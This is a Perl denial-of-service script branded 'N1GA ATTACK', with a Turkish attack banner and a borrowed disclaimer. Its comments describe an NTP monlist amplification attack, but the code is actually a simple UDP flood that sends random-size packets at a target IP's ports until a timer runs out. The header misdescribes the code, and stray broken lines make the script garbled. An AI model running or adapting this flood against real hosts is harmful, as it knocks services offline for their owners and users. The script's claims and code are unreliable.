#!/usr/bin/perl
 #  ntp MON_GETLIST query amplification ddos
#
#  Copyright 2017 (c) N1GA ATTACK 
#  n1ga.ali@gmail.com
#  http://www.direnguard.com
#  https://www.facebook.com/direnguard
#
#  A Network Time Protocol (NTP) Amplification 
#  attack is an emerging form of Distributed 
#  Denial of Service (DDoS) that relies on the 
#  use of publically accessible NTP servers to 
#  overwhelm a victim system with UDP traffic.
#  The NTP service supports a monitoring service 
#  that allows administrators to query the server 
#  for traffic counts of connected clients. This 
#  information is provided via the “monlist” 
#  command. The basic attack technique consists 
#  of an attacker sending a "get monlist" request 
#  to a vulnerable NTP server, with the source 
#  address spoofed to be the victim’s address. 
#
#
#  Disclaimer:
#  This or previous program is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#
#  Use at your own risk and educational 
#  purpose ONLY!
#
#  See also, UDP-based Amplification Attacks:
#  https://www.direnguard.com


use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
use Socket;
use strict;
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "./n1ga.pl <ip> <port> $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print RED <<EOTEXT;
                 SALDIRI BAŞLADI -*-*-*-*-*-*-*-*-*-*-*-*-*-
                        N1GA ATTACK GURURLA SUNAR
                            ts3.direnguard.com
EOTEXT
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
n1ga ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
n1ga ") . "\n";
        print "Saldırıyı Çekmek Icın Ctrl-C\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
##
# @N1GA ATTACK
# @ts3.direnguard.com
##